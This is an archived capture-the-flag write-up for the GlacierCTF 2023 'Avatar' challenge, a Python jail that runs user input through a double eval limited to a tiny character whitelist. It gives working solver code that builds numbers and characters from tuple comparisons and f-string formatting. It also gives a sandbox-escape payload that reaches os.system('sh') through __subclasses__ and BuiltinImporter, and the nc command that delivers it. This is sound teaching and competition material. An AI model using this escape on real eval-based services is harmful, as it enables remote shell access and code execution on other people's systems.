# Avatar

**CTF:** Glacier 2023  
**Category:** misc  
**Original writeup:** <https://sigflag.at/blog/2023/writeup-glacierctf23-avatar/> — by **sigflag.at**. All credit goes to the original author; this is an archived copy.

---

Avatar is a 9-line Python application that was exposed on a network socket:

print ( "You get one chance to awaken from the ice prison." ) code = input ( "input: " ). strip () whitelist = """gctf{"*+*(=>:/)*+*"}""" # not the flag if any ([ x not in whitelist for x in code ]) or len ( code ) > 40000 : print ( "Denied!" ) exit ( 0 ) eval ( eval ( code , { 'globals' : {}, '__builtins__' : {}}, {}), { 'globals' : {}, '__builtins__' : {}}, {})

The application takes a string from the user, checks if that string only contains characters from a whitelist and is not longer than 40,000 characters, and then executes it with eval(eval(input)) .

The whitelist is very restrictive, the only allowed characters are the following:

" ( ) * + / : = > c f g t { }

Both eval calls are also very restrictive, since they don’t allow to access any global variables or built-in functions. Notably, this is eval which evaluates just a single expression, not exec which would execute multiple statements.

We assumed that the flag was probably stored on the file system, which meant that we had to find a way to read files.

1st step: Working around the whitelist

We first need to find a way to encode whatever we want to execute with only the allowed characters. The double-eval is helpful here, since we can use the following strategy:

Use the first eval to output what we want to execute, but with only the allowed characters. Use the second eval to execute that, and find some way to read files next.

For one moment, assume we that the numbers 0-9 were whitelisted. With the {:c} format string specifier, we could then output any character by its ASCII code:

f " { 97 : c } " # => 'a'

Assume also, we would have built-in functions like print available. Then we could encode a print statement like this:

eval ( eval ( f " { 112 : c }{ 114 : c }{ 105 : c }{ 110 : c }{ 116 : c } ( { 39 : c } ctf { 39 : c } )" )) # => "print('ctf')"

Getting numbers without writing numbers

This looks like a promising approach, but unfortunately, numbers are not whitelisted. What is whitelisted however, are the characters * , + , / , = , and > , which might be useful in deriving numbers.

What we can do are comparisons. Consider the following expression that compares if two empty tuples are equal:

() == () # => True

Similarly, we can get False by testing if one operand is greater than the other:

() > () # => False

Booleans are not numbers, but True is equal to 1 and False is equal to 0 . So, let’s do some arithmetic with these. Here is an example that gets us the number 2 :

(() == ()) + (() == ()) # => 2

With a little bit of patience, we can now derive all numbers from 0 to 9 . We also make use of the multiplication operator * and exponentiation operator ** to keep the expressions short:

def encode_number_zero_to_ten ( number : int ): if number == 0 : return """(()>())""" if number == 1 : return """(()==())""" if number == 2 : return """(()==())+(()==())""" # 1 + 1 if number == 3 : return """(()==())+(()==())+(()==())""" # 1 + 1 + 1 if number == 4 : return """(()==())+(()==())+(()==())+(()==())""" # 1 + 1 + 1 + 1 if number == 5 : return """(()==())+(()==())+(()==())+(()==())+(()==())""" # 1 + 1 + 1 + 1 + 1 if number == 6 : return """((()==())+(()==()))*((()==())+(()==())+(()==()))""" # 2 * 3 if number == 7 : return """((()==())+(()==()))*((()==())+(()==())+(()==()))+(()==())""" # 2 * 3 + 1 if number == 8 : return """((()==())+(()==()))**((()==())+(()==())+(()==()))""" # 2 ** 3 if number == 9 : return """((()==())+(()==())+(()==()))**((()==())+(()==()))""" # 3 ** 2 if number == 10 : return """((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==())""" # 3 ** 2 + 1

We did go even further and wrote a function that is able to encode arbitrary numbers. We do so by finding the closest pair of numbers that, when multiplied or exponentiated, is closest to the target number, and then add the remaining difference (if any) to the result. These are some helper functions to find those closest pairs of numbers:

from math import sqrt def find_closest_tuple ( number : int , op , start : int = 1 ): curr_tuple = ( start , start ) curr_offset = number - op ( * curr_tuple ) stop = int ( sqrt ( number ) + 1 ) for i in range ( start , stop ): for j in range ( start , stop ): offset = number - op ( i , j ) if offset >= 0 and offset < curr_offset : curr_offset = offset curr_tuple = ( i , j ) assert curr_offset >= 0 assert number == op ( * curr_tuple ) + curr_offset return curr_offset , curr_tuple def find_closest_mul_tuple ( number : int ): return find_closest_tuple ( number , lambda x , y : x * y ) def find_closest_pow_tuple ( number : int ): return find_closest_tuple ( number , lambda x , y : x ** y )

Here are some examples to illustrate how this works:

find_closest_mul_tuple ( 21 ) # => 5 + (4 * 4) find_closest_mul_tuple ( 42 ) # => 6 + (6 * 6) find_closest_mul_tuple ( 1337 ) # => 41 + (36 * 36)

find_closest_pow_tuple ( 21 ) # => 5 + (2 ** 4) find_closest_pow_tuple ( 42 ) # => 6 + (6 ** 2) find_closest_pow_tuple ( 1337 ) # => 6 + (11 ** 3)

Actually encoding a number is then just a matter of calling the above functions. We also try to choose the encoding with the smaller difference, so that the resulting expression is hopefully shorter. In essence, we can encode any number since the following function is recursive:

def encode_number ( number : int ): if number <= 10 : return encode_number_zero_to_ten ( number ) mul_off , ( m0 , m1 ) = find_closest_mul_tuple ( number ) pow_off , ( p0 , p1 ) = find_closest_pow_tuple ( number ) if mul_off < pow_off : txt = "(" + encode_number ( m0 ) + ")*(" + encode_number ( m1 ) + ")" if mul_off > 0 : txt += "+" + encode_number ( mul_off ) else : txt = "(" + encode_number ( p0 ) + ")**(" + encode_number ( p1 ) + ")" if pow_off > 0 : txt += "+" + encode_number ( pow_off ) return txt

Let’s try it out by encoding the number 100 which is the ASCII code for the character d . It’s hard to read, but this is essentially encoding 10**2 then:

encode_number ( ord ( 'd' )) # => (((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==())) # => 100

Encoding arbitrary strings

We can easily piece together the above building blocks to encode arbitrary strings now:

def encode_text ( text : str ): result = "" for ch in map ( ord , text ): result += "{" + encode_number ( ch ) + ":c}" return result

Let’s try it out by encoding the expression print('ctf') and wrapping it inside a format string:

encode_text ( "print('ctf')" ) # => f"{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==())+(()==())+(()==()):c}{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==())+(()==())+(()==())+(()==())+(()==()):c}{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+(()==())+(()==())+(()==())+(()==())+(()==()):c}{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()):c}{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+((()==())+(()==()))**((()==())+(()==())+(()==())+(()==())):c}{(((()==())+(()==()))*((()==())+(()==())+(()==())))**((()==())+(()==()))+(()==())+(()==())+(()==())+(()==()):c}{(((()==())+(()==()))*((()==())+(()==())+(()==())))**((()==())+(()==()))+(()==())+(()==())+(()==()):c}{((()==())+(()==())+(()==()))**((()==())+(()==())+(()==())+(()==()))+((()==())+(()==()))**((()==())+(()==())+(()==())+(()==()))+(()==())+(()==()):c}{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+((()==())+(()==()))**((()==())+(()==())+(()==())+(()==())):c}{(((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==()))**((()==())+(()==()))+(()==())+(()==()):c}{(((()==())+(()==()))*((()==())+(()==())+(()==())))**((()==())+(()==()))+(()==())+(()==())+(()==()):c}{(((()==())+(()==()))*((()==())+(()==())+(()==())))**((()==())+(()==()))+(()==())+(()==())+(()==())+(()==())+(()==()):c}" # => "print('ctf')"

Wonderful, we can now encode whatever code we want to execute with just the allowed characters.

2nd step: Getting a shell without built-in functions

To browse the target system for the flag, we attempted to directly get a shell. However, we can’t easily execute __import__("os").system("sh") because we have no built-in functions or global variables available. Luckily, there are plenty of ways to get to the built-in functions nonetheless.

After a bit of trial and error, we found the following expression to work well:

[ x for x in ( 1 ). __class__ . __base__ . __subclasses__ () if x . __name__ == 'BuiltinImporter' ][ 0 ](). load_module ( 'os' ). system ( 'sh' )

This is doing the following:

Access the class of the tuple (1) with (1).__class__ and traverse its inheritance tree Find the class BuiltinImporter anywhere in that inheritance tree Create an instance of that class with () Load the module os with .load_module('os') Execute the command sh with .system('sh')

We can encode this expression with the above encode_text function to get the payload.txt (16,764 characters):

payload = "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system('sh')" payload = 'f"{}"' . format ( encode_text ( payload )) with open ( "payload.txt" , "w" ) as f : f . write ( payload )

One can easily forward that payload to the server and keep the connection open. Don’t forget to press ENTER once to actually send the input.

❯ { cat payload . txt ; cat ; } | nc chall . glacierctf . com 13384 You get one chance to awaken from the ice prison . input : ls chall . py flag . txt cat flag . txt gctf { But_wh3n_th3_w0rld_n33d3d_h1m_m0st_h3_sp4wn3d_4_sh3ll }
